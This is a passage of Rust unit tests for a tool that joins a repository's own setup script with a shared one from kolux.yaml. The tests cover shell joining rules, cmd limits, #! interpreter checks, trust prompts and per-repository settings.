            let script = join_both(own, "echo b > shared-ran\ntrue").unwrap();
            let status = std::process::Command::new(&sh).arg("-c").arg(&script).current_dir(&dir).status().unwrap();
            assert_eq!(status.success(), dir.join("shared-ran").is_file(), "the script succeeds exactly when the shared part ran: {script:?}");
            dir.join("shared-ran").is_file()
        };
        assert!(!run("echo a\nfalse"), "an own setup that fails ends the script before kolux.yaml's runs");
        assert!(!run("echo a\nexit 3"), "an own setup that exits non-zero too");
        assert!(run("echo a\ntrue"), "an own setup that works lets the shared one run");
        assert!(run("cd .\nexport A=1"), "what the own part sets up stays for the shared part");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn fix1_the_page_says_when_both_would_be_refused() {
        let none = |_: &str| None::<PathBuf>;
        let git_bash = Some(PathBuf::from("C:/Program Files/Git/bin/bash.exe"));
        // on Windows with no POSIX shell configured, cmd runs only one line and misreads quotes, % and ^
        let multi = both_trouble("make\nmake test", "pnpm i", true, None, none).expect("two lines through cmd");
        assert!(multi.contains("more than one line") && multi.contains("#!/bin/sh"), "{multi}");
        assert!(both_trouble("make", "echo \"hi\"", true, None, none).unwrap().contains("quotes"));
        assert!(both_trouble("make", "echo 100%", true, None, none).unwrap().contains('%'));
        assert_eq!(both_trouble("make", "pnpm i", true, None, none), None, "two plain one-liners join with && and cmd runs them");
        assert_eq!(both_trouble("make\nmake test", "pnpm i", true, git_bash.as_deref(), none), None, "a configured POSIX shell runs the joined lines");
        assert_eq!(both_trouble("make\nmake test", "pnpm i", false, None, none), None, "elsewhere sh runs them");
        // two interpreters that cannot share one script are refused wherever it is
        assert!(both_trouble("#!/bin/sh\nmake", "#!/bin/bash\npnpm i", false, None, none).unwrap().contains("/bin/bash"));

        // and the repository's page carries it next to "Which runs", only when `both` is in force
        // (as on Windows with Git's shells, whatever this PC has: the finder is a stub)
        let profile = tree(&[]);
        let root = tree(&[("kolux.yaml", b"scripts:\n  setup: |\n    #!/bin/bash\n    pnpm i\n")]);
        let store = crate::state::Store::open(&profile).unwrap();
        save_local(&store, &root, "#!/bin/sh\nmake").unwrap();
        let git = |name: &str| Some(PathBuf::from(format!("C:/Program Files/Git/bin/{name}.exe")));
        let shown = |store: &crate::state::Store| repo_setup_on(store, &root, read_shared(&root), true, None, git);
        assert_eq!(shown(&store).run_error, None, "yours alone runs under the default choice");
        set_repo_policy(&store, &root, Some("both")).unwrap();
        let why = shown(&store).run_error.expect("both with two interpreters is refused");
        assert!(why.contains("/bin/sh") && why.contains("/bin/bash"), "{why}");
        set_repo_policy(&store, &root, Some("shared")).unwrap();
        assert_eq!(shown(&store).run_error, None, "the shared script alone runs");
        set_repo_policy(&store, &root, None).unwrap();
        store.set(POLICY_KEY, "both").unwrap();
        assert!(shown(&store).run_error.is_some(), "a global `both` that the repository inherits counts too");
        save_local(&store, &root, "#!/bin/bash\nmake").unwrap();
        assert_eq!(shown(&store).run_error, None, "the same interpreter joins");
        drop(store);
        for d in [profile, root] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn fix2_a_hash_in_the_own_one_liner_does_not_swallow_the_shared_setup() {
        // two plain one-liners still join on one line, which cmd runs too
        assert_eq!(join_both("make", "pnpm i").unwrap(), "make && pnpm i");
        // a # in either part, or an own part that starts with whitespace, joins by lines instead:
        // on one line a POSIX shell would read everything after the # as a comment
        for (own, theirs) in [("pnpm i # deps", "pnpm i"), ("  # TODO", "pnpm i"), ("# TODO", "pnpm i"), ("  make", "pnpm i"), ("make", "pnpm i # deps")] {
            let joined = join_both(own, theirs).unwrap();
            assert!(!joined.contains(" && "), "{own:?} + {theirs:?} must not share a line: {joined:?}");
            assert!(joined.contains("kolux_setup_status") && joined.ends_with(theirs), "the status stop then the shared part: {joined:?}");
        }
        // through a real sh, the shared part runs after a commented own line
        let Some(sh) = test_sh("fix2_a_hash_in_the_own_one_liner_does_not_swallow_the_shared_setup") else { return };
        let dir = tree(&[]);
        for own in ["echo own # deps", "  # TODO", "# TODO"] {
            let _ = std::fs::remove_file(dir.join("shared-ran"));
            let script = join_both(own, "echo b > shared-ran").unwrap();
            let status = std::process::Command::new(&sh).arg("-c").arg(&script).current_dir(&dir).status().unwrap();
            assert!(status.success() && dir.join("shared-ran").is_file(), "kolux.yaml's setup ran after {own:?}: {script:?}");
        }
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn fix2_a_join_cmd_cannot_run_is_refused_before_the_trust_question() {
        let none = |_: &str| None::<PathBuf>;
        let (store, dir, root) = trust_store();
        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: pnpm i\n").unwrap();
        let store = std::sync::Mutex::new(store);
        let asked = std::cell::RefCell::new(0);
        let gate = |r: &Path, kind: &str, script: &str| {
            *asked.borrow_mut() += 1;
            require_trust(&store, r, kind, script)
        };
        let p = root.to_string_lossy().into_owned();
        // Windows with no POSIX shell: a two-line own setup joins by lines, which cmd cannot run
        let err = setup_for_on(&p, Some("make\nmake test".into()), Some("both".into()), &gate, true, None, none).unwrap_err();
        assert!(err.contains("cmd") && err.contains("more than one line"), "the runner says why: {err}");
        assert_eq!(*asked.borrow(), 0, "nothing runs, so nothing is asked about trust");
        assert_eq!(shared_script_on("setup", &root, &root, Some("make\nmake test"), Some("both"), true, None, none), None, "and the trust prompt does not appear either");
        // a # in the own one-liner takes the line join, so cmd refuses that too, before any question
        let err = setup_for_on(&p, Some("pnpm i # deps".into()), Some("both".into()), &gate, true, None, none).unwrap_err();
        assert!(err.contains("more than one line"), "{err}");
        assert_eq!(*asked.borrow(), 0);
        // a #! shell this PC does not have: refused before the question as well
        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: |\n    #!/bin/bash\n    pnpm i\n").unwrap();
        let err = setup_for_on(&p, None, Some("shared".into()), &gate, true, None, none).unwrap_err();
        assert!(err.contains("bash") && err.contains("not found"), "{err}");
        assert_eq!(*asked.borrow(), 0);
        assert_eq!(shared_script_on("setup", &root, &root, None, Some("shared"), true, None, none), None);
        // where the joined script can run, the question is asked, over kolux.yaml's text alone
        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: pnpm i\n").unwrap();
        let err = setup_for_on(&p, Some("make\nmake test".into()), Some("both".into()), &gate, false, None, none).unwrap_err();
        assert!(err.ends_with("this repository's scripts are not trusted yet"), "{err}");
        assert_eq!(*asked.borrow(), 1);
        assert_eq!(shared_script_on("setup", &root, &root, Some("make\nmake test"), Some("both"), false, None, none).as_deref(), Some("pnpm i"));
        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn fix2_both_refuses_a_hashbang_that_names_no_posix_shell_with_one_accurate_message() {
        let node = "#!/usr/bin/env node\nbuild()";
        // two identical node lines no longer go to sh together
        let why = join_both(node, node).expect_err("two identical non-POSIX #! lines must not join");
        assert!(why.contains("/usr/bin/env node") && why.contains("not a POSIX shell"), "{why}");
        for (own, theirs) in [(node, node), (node, "pnpm i"), ("make", node), ("#!/usr/bin/env python3\nprint(1)", "#!/bin/sh\nmake")] {
            let why = join_both(own, theirs).unwrap_err();
            assert!(why.contains("not a POSIX shell") || why.contains("one script cannot run both"), "{why}");
            assert!(!why.contains("would also run"), "the old wording described a run that never happens: {why}");
            if why.contains("not a POSIX shell") {
                assert!(!why.contains("same #! line"), "the same line would not help: {why}");
            }
        }
        // a POSIX #! line still joins with a plain script, or with the same line
        assert!(join_both("#!/bin/bash -e\nmake", "pnpm i").is_ok() && join_both("make", "#!/bin/sh\npnpm i").is_ok() && join_both("#!/bin/sh\nmake", "#!/bin/sh\npnpm i").is_ok());
    }

    #[test]
    fn set033_a_repository_keeps_its_own_policy_and_wait_choice_over_the_global_one() {
        let profile = tree(&[]);
        let (a, b) = (tree(&[]), tree(&[]));
        let store = crate::state::Store::open(&profile).unwrap();
        assert_eq!((repo_policy(&store, &a), repo_wait(&store, &a)), (None, false), "viewing writes nothing and inherits");
        assert_eq!(policy_for(&store, None, &a), None);
        store.set(POLICY_KEY, "shared").unwrap();
        assert_eq!(policy_for(&store, None, &a).as_deref(), Some("shared"), "the global setting is inherited");
        set_repo_policy(&store, &a, Some("both")).unwrap();
        assert_eq!(policy_for(&store, None, &a).as_deref(), Some("both"), "the repository's own choice wins over the global one");
        assert_eq!(policy_for(&store, Some("local".into()), &a).as_deref(), Some("local"), "an argument still wins");
        assert_eq!(policy_for(&store, None, &b).as_deref(), Some("shared"), "another repository is untouched");
        assert!(set_repo_policy(&store, &a, Some("shared-first")).unwrap_err().contains("pick local, shared or both"));
        assert_eq!(repo_policy(&store, &a).as_deref(), Some("both"), "a refused value changes nothing");
        set_repo_wait(&store, &a, true).unwrap();
        assert!(repo_wait(&store, &a) && !repo_wait(&store, &b));
        // the setup the runner and the card both read follows the repository's choice
        let (local, policy) = (Some("make".to_string()), policy_for(&store, None, &a));
        assert_eq!(pick_setup(local.as_deref(), Some("pnpm i".into()), policy.as_deref()).unwrap().0, "make && pnpm i");
        set_repo_policy(&store, &a, None).unwrap();
        assert_eq!(policy_for(&store, None, &a).as_deref(), Some("shared"), "clearing goes back to inheriting");
        // forgetting the project takes both choices with it
        set_repo_policy(&store, &a, Some("local")).unwrap();
        set_repo_policy(&store, &b, Some("both")).unwrap();
        set_repo_wait(&store, &b, true).unwrap();
        prune_setup(&store, &[], &[a.to_string_lossy().to_string()]).unwrap();
        assert_eq!((repo_policy(&store, &a), repo_wait(&store, &a)), (None, false));
        assert_eq!((repo_policy(&store, &b).as_deref(), repo_wait(&store, &b)), (Some("both"), true), "another project's choices stay");
        set_repo_wait(&store, &b, false).unwrap();
        assert!(!repo_wait(&store, &b));
        // SESS-026: the setup launch mode is a new tab by default, kept per repository, and goes with it
        assert_eq!((repo_mode(&store, &a), repo_mode(&store, &b)), ("tab".to_string(), "tab".to_string()), "a new tab by default");
        set_repo_mode(&store, &a, Some("ask")).unwrap();
        assert_eq!((repo_mode(&store, &a).as_str(), repo_mode(&store, &b).as_str()), ("ask", "tab"), "another repository is untouched");
        assert_eq!(repo_setup_on(&store, &a, (None, None), false, None, |_| None).mode, "ask", "the settings page reads it");
        assert!(set_repo_mode(&store, &a, Some("popup")).unwrap_err().contains("pick tab, right, down or ask"));
        assert_eq!(repo_mode(&store, &a), "ask", "a refused value changes nothing");
        set_repo_mode(&store, &a, Some("tab")).unwrap();
        assert!(repo_map::<String>(&store, MODES_KEY).is_empty(), "the default is not written down");
        set_repo_mode(&store, &a, Some("down")).unwrap();
        store.set(MODES_KEY, &format!("{{\"{}\":\"sideways\"}}", crate::projects::name_key(&b.to_string_lossy()).replace('\\', "\\\\"))).unwrap();
        assert_eq!(repo_mode(&store, &b), "tab", "a stray stored value reads as the default");
        set_repo_mode(&store, &a, Some("right")).unwrap();
        prune_setup(&store, &[], &[a.to_string_lossy().to_string()]).unwrap();
        assert_eq!(repo_mode(&store, &a), "tab", "forgetting the project takes its mode with it");
        drop(store);
        for d in [profile, a, b] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn set033_the_page_shows_the_saved_local_setup_and_removing_it_leaves_the_rest() {
        let profile = tree(&[]);
        let (a, b) = (tree(&[("kolux.yaml", b"scripts:\n  setup: pnpm i\n")]), tree(&[]));
        let store = crate::state::Store::open(&profile).unwrap();
        let shown = |root: &Path| repo_setup(&store, root, read_shared(root));
        let first = shown(&a);
        assert_eq!((first.local, first.shared.as_deref(), first.policy, first.inherited.as_str(), first.wait, first.suggest_both), (None, Some("pnpm i"), None, "local", false, false));
        assert_eq!(store.get(LOCAL_KEY).unwrap(), None, "looking wrote nothing");
        save_local(&store, &a, "make\r\nmake test\r\n").unwrap();
        save_local(&store, &b, "npm ci").unwrap();
        let s = shown(&a);
        assert_eq!((s.local.as_deref(), s.suggest_both), (Some("make\nmake test"), true), "both exist and no choice is made: both is suggested");
        set_repo_policy(&store, &a, Some("both")).unwrap();
        assert!(!shown(&a).suggest_both, "a choice ends the suggestion");
        // the undo that used to need a hand edit of the store
        assert_eq!(remove_local(&store, &a), Ok(true));
        let s = shown(&a);
        assert_eq!((s.local, s.shared.as_deref(), s.policy.as_deref()), (None, Some("pnpm i"), Some("both")), "the shared script and the choice stay");
        assert_eq!(local_setup(&store, &b).as_deref(), Some("npm ci"), "another repository keeps its own");
        assert_eq!(remove_local(&store, &a), Ok(false), "nothing left to remove");
        // an unreadable kolux.yaml says so instead of looking empty
        std::fs::write(b.join("kolux.yaml"), vec![b'x'; (READ_MAX + 1) as usize]).unwrap();
        let s = shown(&b);
        assert!(s.shared.is_none() && s.shared_error.unwrap().starts_with("kolux.yaml could not be read"));
        // the global setting is shown as what the page inherits
        store.set(POLICY_KEY, "shared-first").unwrap();
        assert_eq!(shown(&a).inherited, "shared");
        drop(store);
        for d in [profile, a, b] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn proj035_removing_the_saved_setup_from_the_page_lets_the_card_offer_one_again() {
        let profile = tree(&[]);
        let root = tree(&[("package.json", br#"{"packageManager":"pnpm@9.1.0"}"#)]);
        let store = crate::state::Store::open(&profile).unwrap();
        let offer = |store: &crate::state::Store| suggest(&root, local_setup(store, &root).as_deref(), policy_for(store, None, &root).as_deref());
        assert!(matches!(offer(&store), SetupSuggestion::Install { .. }));
        save_suggestion(&store, &root, "install", "pnpm install", None).unwrap();
        assert_eq!(offer(&store), SetupSuggestion::None, "the card Save ended the suggestion");
        assert_eq!(remove_local(&store, &root), Ok(true));
        assert!(matches!(offer(&store), SetupSuggestion::Install { .. }), "the way back from a card Save: the card offers again");
        // a repository that takes only kolux.yaml's script is not offered a local one that would never run
        set_repo_policy(&store, &root, Some("shared")).unwrap();
        assert_eq!(offer(&store), SetupSuggestion::None);
        drop(store);
        for d in [profile, root] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn card13_setup_choices_that_could_not_be_kept_aside_are_never_saved_over() {
        let dir = tree(&[]);
        let store = crate::state::Store::open(&dir).unwrap();
        let broken = "[\"p-1\", \"p-2\"";
        let policies = "{\"c:/a\": \"loc";
        store.set(DISMISSED_KEY, broken).unwrap();
        store.set(POLICIES_KEY, policies).unwrap();
        crate::orchestration::kept::refuse_copies(&dir);
        let err = dismiss_card(&store, "p-9").unwrap_err();
        assert!(err.contains(DISMISSED_KEY) && !err.contains("p-1"), "{err}");
        let err = set_repo_policy(&store, Path::new("C:/a"), Some("local")).unwrap_err();
        assert!(err.contains(POLICIES_KEY), "{err}");
        assert_eq!(store.get(DISMISSED_KEY).unwrap().as_deref(), Some(broken));
        assert_eq!(store.get(POLICIES_KEY).unwrap().as_deref(), Some(policies));
        drop(store);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
